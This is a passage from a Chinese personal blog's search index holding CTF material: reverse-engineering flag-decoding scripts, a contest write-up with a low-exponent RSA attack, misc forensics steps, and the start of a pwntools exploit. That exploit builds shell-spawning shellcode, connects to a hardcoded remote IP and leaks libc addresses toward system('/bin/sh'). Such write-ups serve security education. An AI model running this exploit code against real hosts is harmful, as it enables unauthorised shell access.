punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        cv<span class="token punctuation">.</span>destroyAllWindows<span class="token punctuation">(</span><span class="token punctuation">)</span>img<span class="token operator">=</span> cv<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'demo.png'</span><span class="token punctuation">)</span>gaosi_noise<span class="token punctuation">(</span>cv<span class="token punctuation">.</span>cvtColor<span class="token punctuation">(</span>img<span class="token punctuation">,</span>cv<span class="token punctuation">.</span>COLOR_BGRA2GRAY<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向记录</title>
      <link href="/2021/10/27/ni-xiang-ji-lu/"/>
      <url>/2021/10/27/ni-xiang-ji-lu/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>快到省赛了加油刷题 0_0 </p><p>记录一下攻防世界高阶题目,很陌生的题目很写的很详细0.0)</p></blockquote><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">]</span>k<span class="token operator">=</span><span class="token number">0</span>a2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span> a<span class="token punctuation">[</span>k<span class="token punctuation">]</span>    k<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">%</span><span class="token number">11</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>enc<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x0F</span><span class="token punctuation">,</span><span class="token number">0x1F</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0x1C</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0x0C</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x0D</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0x2D</span><span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x1E</span><span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x0F</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x1C</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0x55</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x0C</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x0A</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>a2<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">length<span class="token operator">=</span><span class="token number">18</span>a2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x7A</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x6F</span><span class="token punctuation">,</span><span class="token number">0x7A</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x2E</span><span class="token punctuation">,</span><span class="token number">0x4B</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x2E</span><span class="token punctuation">,</span><span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a2<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">import</span> string<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length<span class="token operator">^</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">)</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length<span class="token operator">^</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">)</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>length<span class="token operator">^</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">v4<span class="token operator">=</span><span class="token string">'GONDPHyGjPEKruv&#123;&#123;pj]X@rF'</span>byte_21<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x0D</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x1D</span><span class="token punctuation">,</span><span class="token number">0x0C</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x2F</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x2B</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x1F</span><span class="token punctuation">,</span><span class="token number">0x1E</span><span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0x0F</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x0A</span><span class="token punctuation">,</span><span class="token number">0x2F</span><span class="token punctuation">,</span><span class="token number">0x1E</span><span class="token punctuation">,</span><span class="token number">0x1A</span><span class="token punctuation">,</span><span class="token number">0x2D</span><span class="token punctuation">,</span><span class="token number">0x0C</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">sub_40</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>a1<span class="token operator">^</span><span class="token number">0x55</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">72</span><span class="token keyword">import</span> stringdict1<span class="token operator">=</span> string<span class="token punctuation">.</span>printablev3<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp<span class="token operator">=</span>c        <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token operator">>=</span><span class="token number">97</span> <span class="token keyword">and</span> c<span class="token operator">&lt;=</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            c<span class="token operator">-=</span><span class="token number">32</span>            v3<span class="token operator">=</span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>v3<span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">and</span> c<span class="token operator">>=</span><span class="token number">65</span> <span class="token keyword">and</span> c<span class="token operator">&lt;=</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            c<span class="token operator">+=</span><span class="token number">32</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span> byte_21<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c<span class="token operator">^</span><span class="token number">0x55</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">72</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        v3<span class="token operator">=</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 逆向学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四届山东省大学生网络技术大赛WP(部分</title>
      <link href="/2021/10/24/di-si-jie-shan-dong-sheng-da-xue-sheng-wang-luo-ji-zhu-da-sai-wp-bu-fen/"/>
      <url>/2021/10/24/di-si-jie-shan-dong-sheng-da-xue-sheng-wang-luo-ji-zhu-da-sai-wp-bu-fen/</url>
      
        <content type="html"><![CDATA[<h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h3 id="密码2"><a href="#密码2" class="headerlink" title="密码2"></a>密码2</h3><p>低迷指数攻击一把锁</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token number">3</span>c1 <span class="token operator">=</span> <span class="token number">184706733600030961911836917506112422167545490484023895702890946835667701083139603160422181673643482375812680575389095142687410989330788033710088246782628789557043348703224329521695342998531932006194716597523162472306119232610211018033794397444557249275490146884605734496362904120178078821</span>n <span class="token operator">=</span> <span class="token number">62238551978433838001498457736429006991865583728626132139136256391485968857741649418990547571437762934449868634562245286176618471355786138381567476265484214608900167440511382125259943558246159258716213963735131393428605626773031068644321261445284230749457763679689698230585197310945795260304584991080604702929</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>k <span class="token operator">*</span> n <span class="token operator">+</span> c<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> long_to_bytes<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>k <span class="token operator">*</span> n <span class="token operator">+</span> c<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span>m <span class="token operator">=</span> flag<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="奇怪的编码"><a href="#奇怪的编码" class="headerlink" title="奇怪的编码"></a>奇怪的编码</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">编码<span class="token number">1</span>：XXDF23HEpF4Sn7aMa3aBnZVXXencodeDASCTF<span class="token punctuation">&#123;</span>2fbaf79a编码<span class="token number">2</span>：UU<span class="token operator">-</span><span class="token punctuation">,</span>C8T93DR960T<span class="token operator">-</span>60S<span class="token punctuation">,</span>   UUencode264e92ed45d30编码<span class="token number">3</span>：BASE25ooTjYizBkQqcfjAbase589b3646000c9<span class="token punctuation">&#125;</span>DASCTF<span class="token punctuation">&#123;</span>2fbaf79a264e92ed45d309b3646000c9<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="我只是一个普通图片"><a href="#我只是一个普通图片" class="headerlink" title="我只是一个普通图片"></a>我只是一个普通图片</h3><p>观察图片的crc</p><p>显然能构成明文攻击</p><p><img src="https://img-blog.csdnimg.cn/a0da415b1f2f4442a80add0ccf4765fa.png" alt="请添加图片描述"><br>不用等他完成，直接停止，另存一下，解压得到</p><p>flag</p><h3 id="Easy-Office"><a href="#Easy-Office" class="headerlink" title="Easy_Office"></a>Easy_Office</h3><p>docx文件后缀zip解压</p><p>勾选取消隐藏文字得到后一部分flag<br><img src="https://img-blog.csdnimg.cn/8dfe7bf64df940b6bf0bc8f988c848ae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>在字体中发现flag前一部分</p><p><img src="https://img-blog.csdnimg.cn/1038e0f8077241eeb0c3d8bdd5690362.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="excelpic"><a href="#excelpic" class="headerlink" title="excelpic"></a>excelpic</h2><pre class="line-numbers language-none"><code class="language-none">观察发现每个单元格都是3种颜色通道<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/fb66a0555d734cdfa2628942610c8451.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>先恢复图片</p><pre class="line-numbers language-none"><code class="language-none">import openpyxlimport datetimeimport os,refrom openpyxl.styles import Font, Border, Side, PatternFill, colors, Alignmentfile &#x3D; &#39;excelpic.xlsx&#39;wb &#x3D; openpyxl.load_workbook(file,read_only&#x3D;True) sht&#x3D;wb.activeprint(sht.max_row,sht.max_column) newline&#x3D;[]str1&#x3D;&#39;&#39;str2&#x3D;[]for i,datas in enumerate(sht.iter_rows()):for j in datas:str1+&#x3D;(j.fill.fgColor.rgb)[2:]str2.append(j.value)open(&#39;final.txt&#39;,&#39;w&#39;).write(str1)print(str2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">得到一个data文件，因为宽度是85，高度是120，那图片肯定是85x120的把data导入gimp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拿到图片</p><p>zsteg 一把梭<br><img src="https://img-blog.csdnimg.cn/ebec577f034d49f6986c503604436ba1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>拿到flag</p><h3 id="MISC-3"><a href="#MISC-3" class="headerlink" title="MISC 3"></a>MISC 3</h3><pre class="line-numbers language-none"><code class="language-none">当时没做出来 赛后看了一下 出了 还是没多想气死了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接爆破密码rc4   就想到了rc4 加密 </p><p><img src="https://img-blog.csdnimg.cn/6a37bb18079c4c9196301ca511ebcf8a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>去掉这里头 拿到一个png图片</p><p><img src="https://img-blog.csdnimg.cn/583133e5dac544b3aed4cc462f8737b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p><p>当然就是密钥了 rc4 一把梭</p><p><img src="https://img-blog.csdnimg.cn/01b985dcf0434c7a864b48b17b4184ea.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmd5bGlu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p><p>有点可惜！！！！！！！！！！</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">时间太短了 嗯  没错<span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> struct <span class="token keyword">import</span> packcontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>fileName <span class="token operator">=</span> <span class="token string">'pwn12'</span>elfName <span class="token operator">=</span> fileNameremoteLibcName <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remoteAddress <span class="token operator">=</span> <span class="token string">'129.211.209.211'</span>remotePort <span class="token operator">=</span> <span class="token number">10000</span>local <span class="token operator">=</span> <span class="token number">0</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>    context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>fileName<span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>remoteLibcName<span class="token punctuation">)</span>    rgylin <span class="token operator">=</span> process<span class="token punctuation">(</span>fileName<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>    rgylin <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteAddress<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>fileName<span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>remoteLibcName<span class="token punctuation">)</span>s      <span class="token operator">=</span> <span class="token keyword">lambda</span> buf        <span class="token punctuation">:</span> rgylin<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>sl     <span class="token operator">=</span> <span class="token keyword">lambda</span> buf        <span class="token punctuation">:</span> rgylin<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>sa     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> buf <span class="token punctuation">:</span> rgylin<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> buf<span class="token punctuation">)</span>sla    <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> buf <span class="token punctuation">:</span> rgylin<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> buf<span class="token punctuation">)</span>sh     <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> rgylin<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>r      <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token operator">=</span><span class="token boolean">None</span>     <span class="token punctuation">:</span> rgylin<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>ru     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim      <span class="token punctuation">:</span> rgylin<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delim<span class="token punctuation">)</span>r7f    <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>rgylin<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"\x00\x00"</span><span class="token punctuation">)</span>trs    <span class="token operator">=</span> <span class="token keyword">lambda</span> addr       <span class="token punctuation">:</span> libc<span class="token punctuation">.</span>address<span class="token operator">+</span>addrgadget <span class="token operator">=</span> <span class="token keyword">lambda</span> ins        <span class="token punctuation">:</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>ins<span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>tohex  <span class="token operator">=</span> <span class="token keyword">lambda</span> buf        <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"\\x%02x"</span><span class="token operator">%</span><span class="token builtin">ord</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> buf<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>rgylin<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leak_libc</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>functionName<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc_base<span class="token punctuation">,</span>__malloc_hook<span class="token punctuation">,</span>__free_hook<span class="token punctuation">,</span>system<span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span>_IO_2_1_stdout_<span class="token punctuation">,</span>system_addr<span class="token punctuation">,</span>bin_sh_addr    libc_base <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>functionName<span class="token punctuation">)</span><span class="token punctuation">]</span>    __malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>    __free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>    _IO_2_1_stdout_ <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>    system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>    bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">""</span> <span class="token operator">+</span> functionName <span class="token operator">+</span> <span class="token string">"_addr:"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">"libc base:"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">"__malloc_hook:"</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token 